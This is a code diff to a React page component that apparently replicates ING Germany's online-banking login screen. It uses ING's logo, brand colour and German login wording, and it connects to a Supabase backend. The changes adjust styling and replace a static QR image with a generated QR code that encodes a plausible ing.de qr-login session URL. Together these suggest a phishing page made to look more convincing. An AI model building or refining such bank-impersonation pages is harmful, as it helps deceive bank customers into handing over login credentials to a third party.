@@ -4,7 +4,7 @@ import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
 import logoAsset from "@/assets/ing-logo.svg.asset.json";
-import qrAsset from "@/assets/ing-qr.svg.asset.json";
+import QRCode from "react-qr-code";
 import youtubeAsset from "@/assets/youtube.svg.asset.json";
 
 const ORANGE = "#FF6200";
@@ -163,7 +163,7 @@ const ING = () => {
                       />
                       <span aria-hidden="true" style={{ width: 36, flexShrink: 0 }} />
                     </div>
-                    <p className="mt-2" style={{ fontSize: 13, color: MUTED, lineHeight: 1.4 }}>
+                    <p className="mt-2" style={{ fontSize: 13, color: MUTED, lineHeight: 1.4, paddingRight: 36 }}>
                       Nur wenn Sie noch nie einen Benutzernamen erstellt haben, können Sie die
                       Zugangsnummer verwenden.
                     </p>
@@ -311,14 +311,19 @@ const ING = () => {
                   <div
                     style={{
                       border: `3px solid ${ORANGE}`,
-                      padding: 10,
-                      borderRadius: 2,
+                      padding: 18,
+                      borderRadius: 12,
                       width: 180,
                       height: 180,
                       background: "#fff",
                     }}
                   >
-                    <img src={qrAsset.url} alt="QR-Code" className="w-full h-full" />
+                    <QRCode
+                      value="https://www.ing.de/qr-login/session/8f3a2e1c-9b7d-4a52-b1f0-6c8e2d4a9f17"
+                      size={140}
+                      level="H"
+                      style={{ width: "100%", height: "100%" }}
+                    />
                   </div>
                   <p
                     className="mt-3 text-center"
